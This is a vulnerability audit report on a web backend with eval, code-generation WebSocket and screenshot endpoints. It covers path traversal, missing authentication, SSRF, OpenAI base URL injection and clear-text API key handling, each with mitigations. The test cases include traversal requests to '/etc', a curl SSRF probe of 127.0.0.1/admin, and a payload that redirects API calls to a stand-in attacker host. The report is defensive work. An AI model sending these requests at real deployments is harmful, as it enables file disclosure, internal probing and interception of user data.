Below is the combined list of unique vulnerabilities aggregated from the four provided lists. Duplicate items were merged together, and the existing detailed descriptions (including step‑by‑step trigger instructions, impacts, ranks, mitigations, preconditions, source code analysis, and security test cases) have been preserved.

---

## Vulnerability Name: Arbitrary File Disclosure via Eval Endpoints

**Description:**
Several evaluation endpoints (e.g., GET `/evals`, `/pairwise-evals`, and `/best-of-n-evals` in the backend) accept a folder path via a query parameter without proper sanitization. An attacker can manipulate the folder parameter by inserting directory traversal sequences (such as `../`) or even supplying an absolute path (e.g., `/etc`) to force the application to list or read files from unintended directories.

**Step‑by‑step trigger process:**
1. **Craft the Request:** An attacker sends a GET request to an eval endpoint with a malicious folder parameter. For example:
   - `GET http://<server-address>/evals?folder=../`
   - Alternatively, `GET http://<server-address>/evals?folder=/etc`
2. **Path Construction:** The backend converts the user‐supplied folder value directly into a filesystem path using constructs such as `Path(folder)`, without canonicalization or whitelist restrictions.
3. **File Access:** The application checks for the existence of the folder and then calls functions like `os.listdir(folder)` and `open(file)` on that unsanitized input, resulting in a directory listing or reading file contents.
4. **Disclosure:** If sensitive files (e.g., configuration files, HTML pages, logs) reside in that directory and match filters (such as files ending with “.html”), their contents are returned in the JSON response.

**Impact:**
- **Information Disclosure:** An attacker may gain access to sensitive internal files, including configuration files or internal documentation.
- **Further Exploitation Assistance:** Details from disclosed files can reveal application internals that facilitate additional attacks.

**Vulnerability Rank:**
Critical

**Currently Implemented Mitigations:**
- A basic check is performed to verify whether the folder exists (using `Path(folder).exists()`), but there is no validation to ensure the folder is within an allowed directory.

**Missing Mitigations:**
- **Input Sanitization:** Validate and sanitize the folder path to remove directory traversal sequences.
- **Directory Restrictions:** Restrict access by enforcing that the folder parameter resolves only within a white‑listed safe directory.
- **Canonicalization:** Normalize the input path and explicitly reject inputs that navigate upward (e.g., using `../`).

**Preconditions:**
- The eval endpoints are publicly accessible without authentication.
- The server process possesses file‐read permissions on directories even outside the intended evals folder.

**Source Code Analysis:**
- **File:** `backend/routes/evals.py`
  - The endpoint (e.g., `get_evals`) immediately converts the folder query parameter to a `Path` object and uses it with functions like `os.listdir()` without checking against a whitelist.
  - No sanitization or enforcement is applied to ensure the supplied folder remains within an approved path, enabling arbitrary file disclosure.

**Security Test Case:**
1. Use an HTTP client (such as curl or Postman) to send a GET request:
   ```
   GET http://<server-address>/evals?folder=../
   ```
2. Observe the JSON response for a directory listing that reveals files from an unintended path.
3. Repeat the test with an absolute path (e.g., `/etc`) and verify that sensitive files or configurations are disclosed.

---

## Vulnerability Name: Unauthenticated Access to Code Generation Endpoint via WebSocket

**Description:**
The code generation endpoint – implemented as a WebSocket (located at `/generate-code` in the backend) – does not enforce any authentication or authorization controls. This allows an attacker to connect without credentials and trigger expensive, AI-powered code generation operations.

**Step‑by‑step trigger process:**
1. **Establish Connection:** An attacker uses a WebSocket client (for example, using `wscat`) to connect to:
   ```
   ws://<server-address>/generate-code
   ```
2. **Submit Payload:** The attacker sends a properly formatted JSON payload that includes required keys (such as `"image"`, `"generatedCodeConfig"`, and (in non‑production) possibly `"openAiBaseURL"`).
3. **Trigger Code Generation:** The backend accepts the connection immediately—without any authentication or rate limiting—and passes the provided parameters to an external AI service, streaming back generated code.

**Impact:**
- **Financial and Resource Exhaustion:** Unauthorized API calls to premium AI services can result in significant financial loss and degraded performance for legitimate users.
- **Potential Abuse:** The endpoint can be misused to generate undesired or malicious outputs, further facilitating attacks.

**Vulnerability Rank:**
Critical

**Currently Implemented Mitigations:**
- No authentication, access controls, or rate limiting is in place on the WebSocket endpoint; it was intentionally designed to be publicly accessible.

**Missing Mitigations:**
- **Authentication & Authorization:** Enforce access controls (e.g., API keys, OAuth tokens, or session cookies) for WebSocket connections.
- **Rate Limiting & Quotas:** Implement limits on the number of connections or requests per client/IP address.
- **Input Validation:** Validate incoming JSON payloads to further restrict permitted operations.

**Preconditions:**
- The backend is running in a publicly accessible environment.
- The attacker has the ability to open a WebSocket connection and send well-formed JSON data.

**Source Code Analysis:**
- **File:** `backend/routes/generate_code.py`
  - The WebSocket endpoint is defined without any authentication middleware.
  - After accepting a connection with `await websocket.accept()`, the endpoint directly calls `await websocket.receive_json()` to process the incoming payload and forwards it to external AI services without any filtering or validation.

**Security Test Case:**
1. Use a WebSocket client (such as wscat) to connect:
   ```
   wscat -c ws://<server-address>/generate-code
   ```
2. Send a JSON payload with the necessary keys, for example:
   ```json
   {
     "image": "sample_image_data",
     "generatedCodeConfig": { "option": "value" }
   }
   ```
3. Observe that the server streams back code without prompting for any authentication.
4. Optionally, send multiple requests rapidly to check for the lack of rate limiting.

---

## Vulnerability Name: Server‑Side Request Forgery (SSRF) via Screenshot Endpoint

**Description:**
The `/api/screenshot` endpoint accepts a JSON payload containing a user‑supplied URL and forwards it directly to an external screenshot service (`https://api.screenshotone.com/take`) without any validation or sanitization. This can allow an attacker to supply a URL targeting internal resources.

**Step‑by‑step trigger process:**
1. **Craft Payload:** The attacker creates a POST request with a JSON body that includes a malicious URL—for example:
   ```json
   {
     "url": "http://127.0.0.1/admin",
     "apiKey": "dummy-value"
   }
   ```
2. **Submit Request:** The attacker sends the payload to the `/api/screenshot` endpoint.
3. **Forwarding:** The backend directly relays the provided URL to the external screenshot service via an HTTP GET request without checking if the URL points to an internal resource.
4. **Result:** The external service (or the backend’s request) fetches the internal resource, potentially disclosing sensitive information.

**Impact:**
- **Internal Reconnaissance:** An attacker may probe internal networks to identify non‑public resources and services.
- **Sensitive Data Disclosure:** Access to internal endpoints can reveal confidential information about the infrastructure or internal applications.

**Vulnerability Rank:**
High

**Currently Implemented Mitigations:**
- No validation or sanitization is performed on the URL parameter before forwarding it.

**Missing Mitigations:**
- **Input Validation:** Enforce strict checks on the URL to ensure it is both well‑formed and points only to allowed external domains.
- **Domain Whitelisting:** Reject URLs that target internal IP ranges (such as `127.0.0.1` or `10.0.0.0/8`).

**Preconditions:**
- The endpoint is publicly accessible and accepts POST requests with arbitrary URL values.
- The external screenshot service does not validate the URL sufficiently.

**Source Code Analysis:**
- **File:** `backend/routes/screenshot.py`
  - The endpoint reads the `url` field from the incoming JSON payload and directly passes it as a parameter to the HTTP GET request call (`httpx.get("https://api.screenshotone.com/take", params=...)`).
  - No sanitization or verification is performed on the provided URL.

**Security Test Case:**
1. Craft a POST request with a malicious payload using a tool like curl or Postman:
   ```bash
   curl -X POST -H "Content-Type: application/json" -d '{"url": "http://127.0.0.1/admin", "apiKey": "dummy-value"}' http://<server-address>/api/screenshot
   ```
2. Check the response and any forwarded requests to verify that an internal URL is processed.
3. Confirm that the internal resource is exposed or probed, thereby validating the SSRF vector.

---

## Vulnerability Name: OpenAI Base URL Injection Vulnerability

**Description:**
In non‑production environments (when the `IS_PROD` flag is false), the code generation endpoint accepts an additional `openAiBaseURL` parameter in the WebSocket payload. This value is used directly to configure the OpenAI client, allowing an attacker to supply a malicious URL so that subsequent API calls are redirected to an attacker‑controlled server.

**Step‑by‑step trigger process:**
1. **Establish WebSocket Connection:** An attacker connects to `/generate-code` in non‑production mode using a WebSocket client.
2. **Inject Parameter:** The attacker includes an additional field in the JSON payload:
   ```json
   {
     "openAiBaseURL": "http://malicious.example.com/v1",
     "...": "other required parameters"
   }
   ```
3. **Configuration:** The helper function (e.g., `get_from_settings_dialog_or_env`) retrieves the user‑supplied `openAiBaseURL` and, because the application is not in production, passes this value directly to the OpenAI client constructor.
4. **Redirection:** All subsequent API calls intended for OpenAI are then directed to the attacker‑controlled URL.

**Impact:**
- **Interception and Tampering:** An attacker can intercept, read, or modify AI‑related data (including prompts and responses), severely compromising the confidentiality and integrity of the interactions.
- **Potential Data Leakage:** This misdirection can lead to leakage of sensitive information if internal configurations or user data is transmitted to the attacker’s server.

**Vulnerability Rank:**
High

**Currently Implemented Mitigations:**
- In production environments, the user‑supplied base URL is ignored; however, in non‑production mode there are no restrictions.

**Missing Mitigations:**
- **Whitelist Validation:** Validate the `openAiBaseURL` parameter against a strict list of allowed endpoints.
- **Disable in Non‑Prod:** Alternatively, disallow user‑provided OpenAI base URLs entirely in non‑production environments or require additional authentication for this functionality.

**Preconditions:**
- The backend is running in a non‑production setup (with `IS_PROD` set to false).
- The attacker has access to the WebSocket endpoint and can craft the JSON payload accordingly.

**Source Code Analysis:**
- **File:** `backend/routes/generate_code.py`
  - The function `get_from_settings_dialog_or_env` fetches the `"openAiBaseURL"` from the incoming payload and uses it directly if provided, without validation, when the application is not running in production mode.

**Security Test Case:**
1. In a controlled non‑production environment, use a WebSocket client to connect to `/generate-code`.
2. Send a JSON payload containing an `"openAiBaseURL"` field set to an attacker‑controlled URL (e.g., `"http://malicious.example.com/v1"`).
3. Monitor the outgoing HTTP requests from the OpenAI client to verify that they are now directed to the malicious URL, confirming that the injection is effective.

---

## Vulnerability Name: Insecure Handling of User‑Supplied API Keys in the Screenshot Endpoint

**Description:**
The `/api/screenshot` endpoint accepts an API key via the JSON request payload (in the `apiKey` field) and directly uses it when calling an external screenshot service. This design forces users to send their sensitive API keys in clear text over the network and relays the same key unmodified to the third‑party service.

**Step‑by‑step trigger process:**
1. **Send Request:** A user (or attacker) sends a POST request to `/api/screenshot` with a JSON payload such as:
   ```json
   {
     "url": "http://example.com",
     "apiKey": "sk-dummy-api-key"
   }
   ```
2. **Direct Relay:** The backend extracts the API key from the payload and passes it directly into the HTTP request to the external service (e.g., via an HTTP GET call).
3. **Exposure:** Since the API key is handled in clear text without alteration or secure storage, it may be intercepted, replayed, or misused.

**Impact:**
- **Credential Compromise:** Exposed third‑party API keys can be intercepted by attackers, leading to unauthorized usage of the external services and significant financial or reputational damage.
- **Abuse:** Attackers may reuse the compromised API keys to make fraudulent requests, incurring unexpected charges or abusing the service.

**Vulnerability Rank:**
High

**Currently Implemented Mitigations:**
- There is limited guidance (in project documentation) suggesting that users store the API key “only in your browser,” but the endpoint itself does not enforce any secure handling or server‑side verification.

**Missing Mitigations:**
- **Secure Storage:** Do not accept user‑supplied API keys directly. Instead, require that API keys are securely stored on the server and injected via a secure configuration mechanism.
- **Encryption & Verification:** Enforce HTTPS for all communications and add server-side authentication checks before processing API keys.

**Preconditions:**
- The `/api/screenshot` endpoint is publicly accessible and accepts API keys in clear text.
- An attacker is capable of intercepting network traffic (e.g., via a proxy or man‑in‑the‑middle attack).

**Source Code Analysis:**
- **File:** `backend/routes/screenshot.py`
  - The code defines a model (e.g., `ScreenshotRequest`) with fields for `url` and `apiKey` and directly passes these values to the external HTTP request calling the screenshot service, with no intermediate encryption or verification step.

**Security Test Case:**
1. Use an interception tool (such as Burp Suite) to capture a POST request to `/api/screenshot` containing a valid API key.
2. Verify that the API key is transmitted in clear text and is used unmodified in the subsequent request to the external service.
3. Attempt to reuse the intercepted API key to demonstrate that it can be misused on the external service, thereby confirming the vulnerability.

---

*No additional vulnerabilities were found beyond those described above.*
